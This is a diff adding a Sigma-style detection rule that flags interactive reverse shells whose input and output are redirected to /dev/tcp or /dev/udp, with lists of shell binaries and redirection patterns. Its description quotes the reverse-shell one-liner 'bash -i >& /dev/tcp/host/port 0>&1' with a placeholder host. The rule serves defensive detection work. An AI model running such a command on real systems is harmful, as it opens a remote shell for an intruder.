@@ -1,0 +1,41 @@
+title: Interactive Shell Connected to /dev/tcp
+id: fc0527bc-4a23-428f-aed6-d193db7fa40c
+name: nik_chain_shell_reverse_shell_dev_tcp
+status: test
+description: A shell was started with its input and output given to a /dev/tcp or /dev/udp connection, as in bash -i >& /dev/tcp/host/port 0>&1. It is the best known reverse shell.
+author: Nik
+date: '2026-11-25'
+tags:
+- attack.execution
+- attack.t1059.004
+- attack.command-and-control
+- attack.t1095
+logsource:
+  product: nik
+  service: process-chain
+detection:
+  selection_shell:
+    Image|endswith:
+    - /sh
+    - /bash
+    - /dash
+    - /zsh
+    - /ksh
+    - /ash
+    - /csh
+    - /tcsh
+  selection_connected:
+    CommandLine|contains:
+    - /dev/tcp/
+    - /dev/udp/
+  selection_redirected:
+    CommandLine|contains:
+    - '>&'
+    - 0>&1
+    - <&
+    - exec 5<>
+    - exec 196<>
+  condition: selection_shell and selection_connected and selection_redirected
+falsepositives:
+- A script that tests whether a port answers with /dev/tcp (it redirects without a shell)
+level: high
